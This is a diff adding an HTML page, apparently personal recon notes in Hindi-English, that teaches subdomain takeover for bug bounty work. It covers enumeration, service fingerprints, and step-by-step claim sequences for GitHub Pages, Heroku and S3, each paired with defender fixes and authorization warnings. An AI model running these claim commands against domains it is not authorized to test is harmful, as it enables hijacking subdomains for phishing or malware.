@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Subdomain Takeover Complete Arsenal — Recon Notes</title>
+<style>
+  :root{
+    --bg:#060a12; --panel:#0b1120; --panel2:#0e1830; --border:#1c2942;
+    --green:#39ff9d; --cyan:#4fd8ff; --pink:#ff5ea8; --yellow:#ffd447;
+    --red:#ff5470; --purple:#b98bff; --text:#c9d6f0; --dim:#7186ad;
+  }
+  *{box-sizing:border-box;}
+  body{ margin:0; background: radial-gradient(circle at 10% 0%, rgba(79,216,255,0.08), transparent 40%),
+      radial-gradient(circle at 90% 20%, rgba(185,139,255,0.08), transparent 40%), var(--bg);
+    color:var(--text); font-family:'Consolas','SF Mono',monospace; line-height:1.6; padding:0 0 60px 0; }
+  header{ text-align:center; padding:38px 20px 22px; border-bottom:1px solid var(--border);
+    background:linear-gradient(180deg, rgba(79,216,255,0.06), transparent); }
+  header h1{ margin:0; font-size:2rem; letter-spacing:2px; color:var(--cyan); text-shadow:0 0 18px rgba(79,216,255,0.55); }
+  header .sub{ color:var(--dim); margin-top:10px; font-size:0.95rem; }
+  header .warn{ display:inline-block; margin-top:16px; padding:8px 16px; border:1px solid var(--red);
+    color:var(--red); border-radius:6px; font-size:0.85rem; background:rgba(255,84,112,0.07); }
+  .mindset{ max-width:1100px; margin:24px auto 0; padding:18px 24px; border:1px dashed var(--purple);
+    border-radius:8px; background:rgba(185,139,255,0.06); color:var(--purple); text-align:center; font-size:0.95rem; }
+  nav{ max-width:1100px; margin:26px auto; padding:0 20px; display:flex; flex-wrap:wrap; gap:8px; justify-content:center; }
+  nav a{ color:var(--green); border:1px solid var(--border); padding:6px 12px; border-radius:20px;
+    text-decoration:none; font-size:0.8rem; background:var(--panel); transition:0.2s; }
+  nav a:hover{ border-color:var(--green); box-shadow:0 0 10px rgba(57,255,157,0.35); }
+  main{ max-width:1100px; margin:0 auto; padding:0 20px; display:flex; flex-direction:column; gap:26px; }
+  .card{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:24px 26px; position:relative; overflow:hidden; }
+  .card::before{ content:""; position:absolute; top:0; left:0; right:0; height:3px; background:var(--accent); }
+  .tag{ display:inline-block; font-size:0.7rem; letter-spacing:1px; padding:3px 9px; border-radius:4px;
+    color:#04121a; background:var(--accent); font-weight:bold; margin-bottom:10px; }
+  .card h2{ margin:4px 0 12px; font-size:1.35rem; color:var(--accent); }
+  .card p.desc{ color:var(--text); margin:0 0 14px; }
+  .steps{ background:rgba(0,0,0,0.28); border:1px solid var(--border); border-radius:8px; padding:14px 18px; margin:12px 0; }
+  .steps h3{ margin:0 0 8px; font-size:0.85rem; color:var(--dim); text-transform:uppercase; letter-spacing:1px; }
+  .steps ol{ margin:0; padding-left:20px; } .steps li{ margin-bottom:6px; }
+  .example{ background:#020408; border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:6px; padding:14px 16px; font-size:0.85rem; overflow-x:auto; margin:12px 0; color:#8fffc0; white-space:pre-wrap; }
+  .example .c1{color:var(--cyan);} .example .c2{color:var(--pink);} .example .c3{color:var(--yellow);} .example .ok{color:var(--green);}
+  .impact{ display:flex; gap:10px; align-items:center; margin-top:14px; padding:10px 14px; border-radius:6px;
+    background:rgba(255,84,112,0.08); border:1px solid rgba(255,84,112,0.35); color:var(--red); font-size:0.85rem; }
+  .fix{ margin-top:10px; padding:10px 14px; border-radius:6px; background:rgba(57,255,157,0.06);
+    border:1px solid rgba(57,255,157,0.3); color:var(--green); font-size:0.85rem; }
+  code{ color:var(--yellow); }
+  .codesection{ max-width:1100px; margin:10px auto 0; padding:0 20px; }
+  .codesection-header{ text-align:center; padding:30px 20px 10px; }
+  .codesection-header h1{ margin:0; font-size:1.8rem; color:var(--yellow); text-shadow:0 0 16px rgba(255,212,71,0.5); letter-spacing:2px; }
+  .codesection-header p{ color:var(--dim); margin-top:8px; }
+  .codeblock{ background:linear-gradient(180deg, var(--panel2), var(--panel)); border:1px solid var(--border);
+    border-radius:10px; padding:20px 24px; margin-bottom:20px; }
+  .codeblock h3{ color:var(--yellow); margin:0 0 12px; font-size:1.05rem; border-bottom:1px dashed var(--border); padding-bottom:8px;}
+  .codeblock .example{ margin:10px 0; }
+  .codeblock p.note{ color:var(--dim); font-size:0.8rem; margin:6px 0 0; }
+  table.fingerprint{ width:100%; border-collapse:collapse; font-size:0.8rem; margin:10px 0; }
+  table.fingerprint th, table.fingerprint td{ border:1px solid var(--border); padding:8px 10px; text-align:left; }
+  table.fingerprint th{ background:rgba(255,212,71,0.1); color:var(--yellow); }
+  table.fingerprint td{ color:var(--text); }
+  footer{ text-align:center; color:var(--dim); font-size:0.8rem; margin-top:40px; padding:0 20px; }
+  footer .box{ max-width:700px; margin:0 auto; border:1px dashed var(--border); border-radius:8px; padding:16px; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>&gt; SUBDOMAIN_TAKEOVER_COMPLETE.md</h1>
+  <div class="sub">DNS se lekar full takeover tak — poora step-by-step methodology + GitHub Pages special</div>
+  <div class="warn">⚠ Sirf authorized programs (HackerOne scope) pe hi apply karna — bina permission illegal hai</div>
+</header>
+
+<div class="mindset">
+  🧠 <strong>Concept simple hai:</strong> Subdomain (jaise <code>blog.target.com</code>) ka DNS record kisi third-party service (GitHub Pages, S3, Heroku) ko point karta hai. Agar wo service-side resource delete/unclaimed ho jaaye lekin DNS record hata na jaaye — to koi bhi wahi service pe jaake apne naam se resource claim kar sakta hai, aur poora subdomain "takeover" ho jaata hai.
+</div>
+
+<nav>
+  <a href="#t1">01 DNS Records Samjho</a>
+  <a href="#t2">02 Subdomain Enumeration</a>
+  <a href="#t3">03 Dangling CNAME Pehchano</a>
+  <a href="#t4">04 Fingerprint Check</a>
+  <a href="#t5">05 GitHub Pages Takeover</a>
+  <a href="#t6">06 Heroku Takeover</a>
+  <a href="#t7">07 AWS S3 Takeover</a>
+  <a href="#t8">08 Automated Scanning</a>
+  <a href="#t9">09 PoC Banake Report</a>
+  <a href="#code">💾 Code Arsenal</a>
+</nav>
+
+<main>
+
+  <!-- 01 -->
+  <div class="card" id="t1" style="--accent:var(--green)">
+    <span class="tag">FOUNDATION</span>
+    <h2>01. Pehle DNS Records Samjho (CNAME Kya Hota Hai)</h2>
+    <p class="desc">Subdomain takeover samajhne ke liye pehle yeh clear hona chahiye — <code>blog.target.com</code> jaisa subdomain apna khud ka server nahi hota, wo DNS mein ek <code>CNAME</code> record ke through kisi third-party service (jaise GitHub Pages) ki taraf "point" karta hai.</p>
+    <div class="steps">
+      <h3>Basic samjho</h3>
+      <ol>
+        <li><code>CNAME</code> record ka matlab hai "yeh naam doosre naam ka alias hai" — jaise <code>blog.target.com</code> → <code>target.github.io</code>.</li>
+        <li>Jab browser <code>blog.target.com</code> khojta hai, DNS usse bolta hai "asal mein <code>target.github.io</code> pe jaao".</li>
+        <li>GitHub Pages apni taraf se check karta hai — "kya koi mera user/repo hai jiska naam <code>target</code> hai aur usne <code>blog.target.com</code> ko apna custom-domain bola hai?"</li>
+        <li>Agar company ne GitHub se account/repo delete kar diya, lekin DNS record (<code>CNAME</code>) hatana bhool gayi — to <code>target.github.io</code> ab "khaali" hai, koi claim nahi kar raha.</li>
+        <li>Yehi khaali jagah attacker claim kar sakta hai apne naam se.</li>
+      </ol>
+    </div>
+    <div class="example">blog.target.com  --CNAME-->  target.github.io  --(unclaimed)-->  <span class="c2">koi bhi claim kar sakta hai</span></div>
+    <div class="impact">💥 Note: Yehi concept lagbhag har cloud/SaaS service pe apply hota hai — sirf service alag-alag hoti hai.</div>
+    <div class="fix">🛡 Reminder: Jab bhi koi third-party resource (repo, app, bucket) delete karo, uska DNS record bhi turant hatao.</div>
+  </div>
+
+  <!-- 02 -->
+  <div class="card" id="t2" style="--accent:var(--cyan)">
+    <span class="tag">RECON</span>
+    <h2>02. Subdomain Enumeration (Pehle Poori List Nikaalo)</h2>
+    <p class="desc">Takeover dhoondne ka pehla practical step hai — target ke jitne bhi subdomains hain, unki poori list banana. Jitni badi list, utna zyada chance kisi purane/bhoole-hue subdomain ka.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Passive tools use karo (Subfinder, Amass, crt.sh) — yeh bina target ko directly touch kiye subdomains nikalte hain (certificate logs, search engines se).</li>
+        <li>Active enumeration bhi karo — wordlist-based DNS brute-force (jaise <code>dev.</code>, <code>staging.</code>, <code>old.</code>, <code>blog.</code>).</li>
+        <li>Saari list ek file mein combine + duplicate-remove karo.</li>
+        <li>Har subdomain ka CNAME record resolve karo (poora list Code Arsenal mein hai).</li>
+      </ol>
+    </div>
+    <div class="example">subfinder -d target.com -o subs.txt
+amass enum -passive -d target.com -o subs2.txt
+cat subs.txt subs2.txt | sort -u > all_subs.txt</div>
+    <div class="impact">💥 Note: Jitne zyada purane/staging/dev subdomains milenge, utna zyada chance hai "bhoole hue" resources ka.</div>
+    <div class="fix">🛡 Reminder: Companies ke liye — periodic subdomain audit rakho, unused subdomains DNS se hatao.</div>
+  </div>
+
+  <!-- 03 -->
+  <div class="card" id="t3" style="--accent:var(--pink)">
+    <span class="tag">CORE STEP</span>
+    <h2>03. Dangling CNAME Pehchano (Jo "Khaali" Point Kar Rahe Hain)</h2>
+    <p class="desc">Ab poori list mein se un subdomains ko filter karna hai jinka CNAME kisi third-party service ki taraf jaata hai lekin wo service-side resource exist nahi karta — inhe "dangling" (latakta hua, bina base ke) kehte hain.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Har subdomain ka CNAME record resolve karo (<code>dig</code> ya <code>host</code> command se).</li>
+        <li>Jo bhi CNAME kisi known third-party service (github.io, herokuapp.com, s3.amazonaws.com, azurewebsites.net, etc.) ki taraf point karta hai, usko note karo.</li>
+        <li>Un subdomains ko actually browser/curl se visit karo.</li>
+        <li>Error messages dhoondo jo batate hain "yeh resource exist nahi karta" (har service ka apna specific error hota hai — neeche fingerprint table mein hai).</li>
+      </ol>
+    </div>
+    <div class="example">dig blog.target.com CNAME +short
+<span class="c1">// output: target.github.io</span>
+
+curl -s https://blog.target.com
+<span class="c3">// response: "There isn't a GitHub Pages site here."  ← yeh signal hai!</span></div>
+    <div class="impact">💥 Impact: Yehi signal confirm karta hai ki subdomain "dangling" hai aur takeover ka candidate hai.</div>
+    <div class="fix">🛡 Fix: (defender) DNS record ko resource delete karte hi turant hata do, monitoring set karo dangling CNAMEs ke liye.</div>
+  </div>
+
+  <!-- 04 -->
+  <div class="card" id="t4" style="--accent:var(--yellow)">
+    <span class="tag">CORE STEP</span>
+    <h2>04. Service Fingerprint Karo (Kaunsi Service Hai, Vulnerable Hai Ya Nahi)</h2>
+    <p class="desc">Har third-party service ka apna specific "not found" error hota hai, jisse pehchana ja sakta hai ki service kaunsi hai. Kuch services vulnerable hoti hain takeover ke liye, kuch nahi (yeh table yaad rakho).</p>
+    <div class="steps">
+      <h3>Fingerprint reference table</h3>
+    </div>
+    <table class="fingerprint">
+      <tr><th>Service</th><th>CNAME Pattern</th><th>Error Message Signal</th><th>Takeover Possible?</th></tr>
+      <tr><td>GitHub Pages</td><td><code>*.github.io</code></td><td>"There isn't a GitHub Pages site here."</td><td class="ok">✅ Haan</td></tr>
+      <tr><td>Heroku</td><td><code>*.herokuapp.com</code></td><td>"No such app"</td><td class="ok">✅ Haan</td></tr>
+      <tr><td>AWS S3</td><td><code>*.s3.amazonaws.com</code></td><td>"NoSuchBucket"</td><td class="ok">✅ Haan (agar bucket-name available)</td></tr>
+      <tr><td>Azure</td><td><code>*.azurewebsites.net</code></td><td>"404 Web Site not found"</td><td class="ok">✅ Haan</td></tr>
+      <tr><td>Shopify</td><td><code>*.myshopify.com</code></td><td>"Sorry, this shop is currently unavailable"</td><td class="ok">✅ Haan</td></tr>
+      <tr><td>Fastly</td><td>varies</td><td>"Fastly error: unknown domain"</td><td class="ok">✅ Haan (config-dependent)</td></tr>
+      <tr><td>Cloudflare Pages</td><td><code>*.pages.dev</code></td><td>"1001 error"</td><td class="ok">✅ Haan</td></tr>
+      <tr><td>Netlify</td><td><code>*.netlify.app</code></td><td>"Not Found - Request ID"</td><td class="ok">✅ Haan (kabhi)</td></tr>
+    </table>
+    <div class="impact">💥 Note: List badalti rehti hai (services apna security model update karte rehte hain) — hamesha <code>can-i-take-over-xyz</code> GitHub repo se latest status check karo (Code Arsenal mein link hai).</div>
+    <div class="fix">🛡 Reminder: Ek service "vulnerable" list mein hai matlab yeh nahi ki har case takeover hoga — resource actually claim-able honi chahiye.</div>
+  </div>
+
+  <!-- 05 -->
+  <div class="card" id="t5" style="--accent:var(--purple)">
+    <span class="tag">DETAILED WALKTHROUGH</span>
+    <h2>05. GitHub Pages Takeover — Poora Step-by-Step</h2>
+    <p class="desc">Yeh sabse common aur classic takeover hai. Company ne GitHub Pages use kiya tha (jaise <code>blog.target.com</code> → <code>companyname.github.io</code>), fir GitHub repo/organization delete kar diya, lekin DNS record chhod diya.</p>
+    <div class="steps">
+      <h3>Poora Step-by-Step</h3>
+      <ol>
+        <li><strong>Confirm karo:</strong> <code>dig blog.target.com CNAME</code> se pata karo CNAME <code>*.github.io</code> ki taraf point kar raha hai.</li>
+        <li><strong>Error verify karo:</strong> Browser/curl se <code>blog.target.com</code> visit karo — "There isn't a GitHub Pages site here." wala 404 aana chahiye.</li>
+        <li><strong>Username nikaalo:</strong> CNAME value se GitHub username/org-name pata chalega (jaise <code>companyname.github.io</code> mein "companyname" hi GitHub username hai).</li>
+        <li><strong>Availability check karo:</strong> <code>https://github.com/companyname</code> visit karo — agar "This is not the web page you are looking for" ya 404 aaye, matlab yeh username free hai claim karne ke liye.</li>
+        <li><strong>GitHub account banao:</strong> Bilkul wahi username (<code>companyname</code>) se naya GitHub account register karo.</li>
+        <li><strong>Repo banao:</strong> Naye account mein ek repository banao naam <code>companyname.github.io</code> (yeh naam GitHub Pages ke liye special hota hai — automatically publish hota hai).</li>
+        <li><strong>index.html add karo:</strong> Repo mein ek simple <code>index.html</code> file push karo (apna PoC message ke saath, jaise "Subdomain takeover PoC by [tumhara handle]").</li>
+        <li><strong>Custom domain set karo:</strong> Repo Settings → Pages → Custom domain mein <code>blog.target.com</code> daalo aur save karo — GitHub ab isko verify karega (CNAME file automatically repo mein add ho jaati hai).</li>
+        <li><strong>Wait karo aur confirm karo:</strong> Kuch minutes baad <code>https://blog.target.com</code> visit karo — agar tumhara <code>index.html</code> content dikhta hai, takeover successful hai.</li>
+        <li><strong>Screenshot/PoC lo, turant HackerOne pe report karo</strong> — takeover ko live mat chhodo, report submit karte hi ya turant baad content hata do agar policy maange.</li>
+      </ol>
+    </div>
+    <div class="example"><span class="c1">// Step 1-2: Confirm</span>
+dig blog.target.com CNAME +short
+<span class="c3">→ companyname.github.io</span>
+curl -s https://blog.target.com | grep "There isn't a GitHub Pages site"
+
+<span class="c1">// Step 5-8: Claim (git commands)</span>
+git init
+echo "&lt;h1&gt;Subdomain Takeover PoC&lt;/h1&gt;" &gt; index.html
+git add index.html
+git commit -m "poc"
+git branch -M main
+git remote add origin https://github.com/companyname/companyname.github.io.git
+git push -u origin main
+<span class="c1">// CNAME file bhi add karo:</span>
+echo "blog.target.com" &gt; CNAME
+git add CNAME &amp;&amp; git commit -m "custom domain" &amp;&amp; git push</div>
+    <div class="impact">💥 Impact: Attacker ab is subdomain pe koi bhi content serve kar sakta hai — phishing page, malware, ya legitimate-looking login form jo credentials churaye (khaaskar agar subdomain SSL cert bhi mil jaaye).</div>
+    <div class="fix">🛡 Fix: GitHub repo/account delete karne se pehle DNS CNAME record hatao, ya organization ka naam kabhi release mat karo agar subdomain still point kar raha hai.</div>
+  </div>
+
+  <!-- 06 -->
+  <div class="card" id="t6" style="--accent:var(--red)">
+    <span class="tag">DETAILED WALKTHROUGH</span>
+    <h2>06. Heroku App Takeover — Step-by-Step</h2>
+    <p class="desc">Heroku pe app delete ho jaane ke baad uska subdomain-name (<code>appname.herokuapp.com</code>) dobara available ho jaata hai — koi bhi naya user wahi naam se app bana sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>CNAME confirm karo — <code>*.herokuapp.com</code> ki taraf point kar raha ho.</li>
+        <li>Target subdomain visit karo — "No such app" error aana chahiye.</li>
+        <li>CNAME value se app-name nikaalo (jaise <code>oldapp.herokuapp.com</code> se "oldapp").</li>
+        <li>Heroku account banao (free tier kaafi hai), Heroku CLI install karo.</li>
+        <li>Bilkul wahi app-name se naya app create karne ki koshish karo.</li>
+        <li>Agar naam available mila, ek simple app deploy karo, custom-domain settings mein target subdomain add karo.</li>
+        <li>Verify karo target subdomain ab tumhara content serve kar raha hai.</li>
+      </ol>
+    </div>
+    <div class="example">heroku login
+heroku create <span class="c3">oldapp</span>   <span class="c1"># agar naam available hai to successfully create hoga</span>
+git push heroku main
+heroku domains:add blog.target.com</div>
+    <div class="impact">💥 Impact: GitHub Pages jaisa hi — full content control us subdomain pe.</div>
+    <div class="fix">🛡 Fix: App delete karne se pehle custom-domain DNS record remove karo.</div>
+  </div>
+
+  <!-- 07 -->
+  <div class="card" id="t7" style="--accent:var(--green)">
+    <span class="tag">DETAILED WALKTHROUGH</span>
+    <h2>07. AWS S3 Bucket Takeover — Step-by-Step</h2>
+    <p class="desc">Agar subdomain ek S3 bucket ki taraf point karta hai jo delete ho chuka hai (lekin naam kisi ne block nahi kiya), to wahi bucket-name dobara create karke content serve kiya ja sakta hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>CNAME check karo — <code>*.s3.amazonaws.com</code> ya <code>*.s3-website-region.amazonaws.com</code> pattern.</li>
+        <li>Target subdomain visit karo — "NoSuchBucket" XML error aana chahiye.</li>
+        <li>CNAME/URL se bucket-name nikaalo.</li>
+        <li>AWS CLI se check karo bucket available hai ya nahi (bucket names globally-unique hote hain).</li>
+        <li>Agar available hai, wahi naam se apna bucket create karo, static-website-hosting enable karo, ek index.html upload karo.</li>
+        <li>Verify karo target subdomain ab tumhara content dikha raha hai.</li>
+      </ol>
+    </div>
+    <div class="example">aws s3api head-bucket --bucket <span class="c3">old-bucket-name</span>
+<span class="c1"># agar "404 Not Found" aaye, matlab bucket available hai</span>
+
+aws s3 mb s3://<span class="c3">old-bucket-name</span>
+aws s3 website s3://<span class="c3">old-bucket-name</span>/ --index-document index.html
+echo "&lt;h1&gt;PoC&lt;/h1&gt;" &gt; index.html
+aws s3 cp index.html s3://<span class="c3">old-bucket-name</span>/</div>
+    <div class="impact">💥 Impact: S3-hosted static sites/assets completely attacker-controlled ho jaate hain.</div>
+    <div class="fix">🛡 Fix: Bucket delete karne se pehle DNS record hatao, ya bucket-name ko kisi placeholder/locked account se permanently reserve karo.</div>
+  </div>
+
+  <!-- 08 -->
+  <div class="card" id="t8" style="--accent:var(--cyan)">
+    <span class="tag">SCALE</span>
+    <h2>08. Automated Scanning (Bade Scope Ke Liye)</h2>
+    <p class="desc">Manual check karna ek target ke liye theek hai, lekin agar scope mein sainkdon subdomains hain, to automated tools (Subjack, Nuclei) se sabko ek saath scan karna zyada efficient hai.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Poori subdomain list ready karo (Step 02 wala).</li>
+        <li>Subjack ya Nuclei subdomain-takeover templates se scan chalao.</li>
+        <li>Tool "possible takeover" flag kare wahi results manually verify karo (false positives common hain).</li>
+        <li>Manual verification ke baad hi actual claim/takeover attempt karo.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Note: Automation sirf "candidates" deta hai — final confirmation hamesha manual hi karo.</div>
+    <div class="fix">🛡 Reminder: Tools false-positive de sakte hain, kabhi bhi bina verify kiye report mat karo.</div>
+  </div>
+
+  <!-- 09 -->
+  <div class="card" id="t9" style="--accent:var(--pink)">
+    <span class="tag">REPORTING</span>
+    <h2>09. PoC Banake Turant Report Karo</h2>
+    <p class="desc">Subdomain takeover milne ke baad sabse zaroori cheez hai — jaldi, safely, aur ethically report karna. Yeh "live" vulnerability hai, isliye zyada der uska control apne paas mat rakho.</p>
+    <div class="steps">
+      <h3>Steps</h3>
+      <ol>
+        <li>Minimal, harmless PoC page banao (sirf ek text/heading jo confirm kare takeover hua — koi phishing/malicious content nahi).</li>
+        <li>Screenshot + URL + timestamp le lo.</li>
+        <li>DNS record (CNAME) ka bhi screenshot lo (dig/nslookup output).</li>
+        <li>Turant HackerOne report submit karo — poora reproduction steps daalo (bilkul isi tarah jaise yahan likha hai).</li>
+        <li>Report submit hone ke baad, agar company/policy maange, apna claimed resource (repo/app/bucket) delete kar do taaki koi aur exploit na kare.</li>
+      </ol>
+    </div>
+    <div class="impact">💥 Impact: Zyada der takeover "live" chhodna khud ek risk hai — koi aur bhi discover kar sakta hai aur malicious use kar sakta hai.</div>
+    <div class="fix">🛡 Reminder: Responsible disclosure — jaldi report karo, minimal footprint rakho.</div>
+  </div>
+
+</main>
+
+<div class="codesection" id="code">
+  <div class="codesection-header">
+    <h1>💾 CODE ARSENAL — SUBDOMAIN TAKEOVER</h1>
+    <p>Ready-to-use commands, poora workflow — copy-paste karke seedha use karo</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>🔍 Subdomain Enumeration — Full Command Set</h3>
+    <div class="example"><span class="c1"># Subfinder (passive)</span>
+subfinder -d target.com -all -o subfinder_subs.txt
+
+<span class="c1"># Amass (passive)</span>
+amass enum -passive -d target.com -o amass_subs.txt
+
+<span class="c1"># crt.sh (certificate transparency, curl se direct)</span>
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+<span class="c1"># Combine + dedupe</span>
+cat subfinder_subs.txt amass_subs.txt | sort -u > all_subs.txt
+
+<span class="c1"># Active brute-force (agar zyada coverage chahiye)</span>
+puredns bruteforce subdomains-wordlist.txt target.com -r resolvers.txt -w bruteforced_subs.txt</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🌐 DNS Resolution — CNAME Check Har Subdomain Ka</h3>
+    <div class="example"><span class="c1"># Single subdomain</span>
+dig blog.target.com CNAME +short
+
+<span class="c1"># Poori list ke liye loop</span>
+while read sub; do
+  cname=$(dig "$sub" CNAME +short)
+  if [ -n "$cname" ]; then
+    echo "$sub -> $cname"
+  fi
+done &lt; all_subs.txt &gt; cname_results.txt
+
+<span class="c1"># host command se alternative</span>
+host blog.target.com</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🎯 Subjack — Automated Takeover Scanner</h3>
+    <div class="example">go install github.com/haccer/subjack@latest
+
+subjack -w all_subs.txt -t 100 -timeout 30 -o results.txt -ssl -v</div>
+    <p class="note">Fingerprints file (jaunty/fingerprints.json) automatically use hoti hai — chaaho to custom fingerprints bhi add kar sakte ho.</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>⚡ Nuclei — Subdomain Takeover Templates</h3>
+    <div class="example">nuclei -update-templates
+
+nuclei -l all_subs.txt -t nuclei-templates/http/takeovers/ -o nuclei_takeover_results.txt</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🐙 GitHub Pages Takeover — Poora Command Sequence</h3>
+    <div class="example"><span class="c1"># 1. Confirm CNAME + error</span>
+dig blog.target.com CNAME +short
+curl -s https://blog.target.com | grep -i "There isn't a GitHub Pages"
+
+<span class="c1"># 2. GitHub username check (browser se bhi kar sakte ho)</span>
+curl -s -o /dev/null -w "%{http_code}" https://github.com/companyname
+
+<span class="c1"># 3. Naya account banao (browser se), fir repo setup:</span>
+mkdir companyname.github.io &amp;&amp; cd companyname.github.io
+git init
+echo "&lt;h1&gt;Subdomain Takeover PoC by YOURHANDLE&lt;/h1&gt;" &gt; index.html
+echo "blog.target.com" &gt; CNAME
+git add .
+git commit -m "poc"
+git branch -M main
+git remote add origin https://github.com/companyname/companyname.github.io.git
+git push -u origin main
+
+<span class="c1"># 4. Verify (kuch minute wait karke)</span>
+curl -s https://blog.target.com | grep "Subdomain Takeover PoC"</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🟣 Heroku Takeover — Command Sequence</h3>
+    <div class="example">heroku login
+heroku create oldapp-name
+echo "web: node index.js" &gt; Procfile
+git init &amp;&amp; git add . &amp;&amp; git commit -m "poc"
+git push heroku main
+heroku domains:add blog.target.com --app oldapp-name</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>🟠 AWS S3 Takeover — Command Sequence</h3>
+    <div class="example">aws s3api head-bucket --bucket old-bucket-name 2&gt;&amp;1 | grep "Not Found"
+
+aws s3 mb s3://old-bucket-name --region us-east-1
+aws s3 website s3://old-bucket-name/ --index-document index.html
+
+echo "&lt;h1&gt;PoC&lt;/h1&gt;" &gt; index.html
+aws s3 cp index.html s3://old-bucket-name/ --acl public-read</div>
+  </div>
+
+  <div class="codeblock">
+    <h3>📋 Fingerprint Database (Community Maintained)</h3>
+    <div class="example">https://github.com/EdOverflow/can-i-take-over-xyz</div>
+    <p class="note">Yeh repo har service ka latest "vulnerable ya nahi" status maintain karta hai — services apna security model change karte rehte hain, isliye hamesha yahan double-check karo.</p>
+  </div>
+
+  <div class="codeblock">
+    <h3>🐍 Python — Bulk CNAME + Fingerprint Checker</h3>
+    <div class="example"><span class="c1">import subprocess, requests
+
+fingerprints = {
+    "github.io": "There isn't a GitHub Pages site here",
+    "herokuapp.com": "No such app",
+    "s3.amazonaws.com": "NoSuchBucket",
+    "azurewebsites.net": "404 Web Site not found",
+    "myshopify.com": "Sorry, this shop is currently unavailable",
+}
+
+with open("all_subs.txt") as f:
+    subs = [s.strip() for s in f.readlines()]
+
+for sub in subs:
+    try:
+        cname = subprocess.check_output(["dig", sub, "CNAME", "+short"]).decode().strip()
+        for service, signal in fingerprints.items():
+            if service in cname:
+                try:
+                    r = requests.get(f"http://{sub}", timeout=5)
+                    if signal.lower() in r.text.lower():
+                        print(f"[VULNERABLE?] {sub} -> {cname}")
+                except:
+                    pass
+    except:
+        pass</span></div>
+  </div>
+
+</div>
+
+<footer>
+  <div class="box">
+    Ye reference sirf <strong style="color:var(--green)">authorized</strong> HackerOne / apne lab targets pe testing ke liye hai.<br>
+    Bina permission kisi bhi live system pe try karna cybercrime hai (IT Act 2000).<br><br>
+    Recon Notes ka part — roadmap: Bug Bounty → Red Team → OSCP
+  </div>
+</footer>
+
+</body>
+</html>
